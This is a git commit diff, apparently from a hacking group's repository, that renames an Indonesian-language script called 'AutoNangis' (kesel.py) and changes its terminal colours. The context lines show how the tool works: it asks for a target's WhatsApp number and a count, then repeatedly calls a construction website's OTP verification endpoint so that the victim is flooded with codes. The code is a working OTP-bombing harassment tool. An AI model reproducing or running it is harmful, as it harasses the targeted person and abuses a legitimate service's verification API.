26481f8dcafa128418deb8ab834ce61bfd76fd42
Ryzz_ D1P5EY <73215831+Ryzz03@users.noreply.github.com>
2020-10-25 07:00:06 +0800

    Update and rename Kesel.py to kesel.py

--- kesel.py
+++ kesel.py
@@ -14,9 +14,9 @@ try:
  %sAuthor   : Ryzz%s
  %sWhatsApp : +6282192959xxx%s
  %sTeam     : P4R4S1T CYBER%s
- %s========[AutoNangis]========"""%(G0,W0,G0,Y0,G0,Y0,G0,Y0,G0,G0)
- gg = raw_input("%s[%s?%s] %sNo. WA Target (ex:08xxx) : "%(W0,C0,W0,W0))
- gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa kak? : "%(W0,C0,W0,W0)))
+ %s========[AutoNangis]========"""%(G0,W0,G0,Y0,G0,Y0,G0,Y0,W0,G0)
+ gg = raw_input("%s[%s?%s] %sNo. WA Target (ex:08xxx) : "%(W0,C0,W0,R0))
+ gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa kak? : "%(W0,C0,W0,R0)))
  c = 1
  for x in range(gi):
   h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
